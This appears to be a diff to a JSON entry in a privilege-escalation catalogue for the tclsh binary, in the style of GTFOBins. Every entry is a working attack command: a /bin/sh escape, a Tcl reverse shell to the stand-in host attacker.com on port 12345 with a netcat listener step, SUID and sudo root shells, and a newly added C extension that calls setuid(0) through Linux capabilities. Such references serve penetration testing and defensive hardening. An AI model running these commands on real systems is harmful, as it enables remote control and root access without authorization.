@@ -2,26 +2,28 @@
   "functions": {
     "shell": [
       {
-        
-        "code": "tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
+        "code": "tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr"
       }
     ],
     "non-interactive-reverse-shell": [
       {
         "description": "Run `nc -l -p 12345` on the attacker box to receive the shell.",
-        "code": "export RHOST=attacker.com\nexport RPORT=12345\necho 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh\n"
+        "code": "export RHOST=attacker.com\nexport RPORT=12345\necho 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh"
       }
     ],
     "suid": [
       {
-        
-        "code": "./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr\n"
+        "code": "./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr"
       }
     ],
     "sudo": [
       {
-        
-        "code": "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
+        "code": "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr"
+      }
+    ],
+    "capabilities": [
+      {
+        "code": "echo -e '#include <tcl.h>\\n#include <unistd.h>\\nint SetUidCmd(ClientData, Tcl_Interp *interp, int, const char **) { return setuid(0) == -1 ? (Tcl_SetResult(interp, \"Failed to set UID\", TCL_STATIC), TCL_ERROR) : TCL_OK; } int Setuid_Init(Tcl_Interp *interp) { Tcl_CreateCommand(interp, \"setuid\", SetUidCmd, NULL, NULL); return TCL_OK; }' | gcc -shared -o setuid.so -fPIC -I/usr/include/tcl8.6 -ltcl -x c -\n./tclsh\nload ./setuid.so\nsetuid\nexec /bin/sh -p <@stdin >@stdout 2>@stderr"
       }
     ]
   }
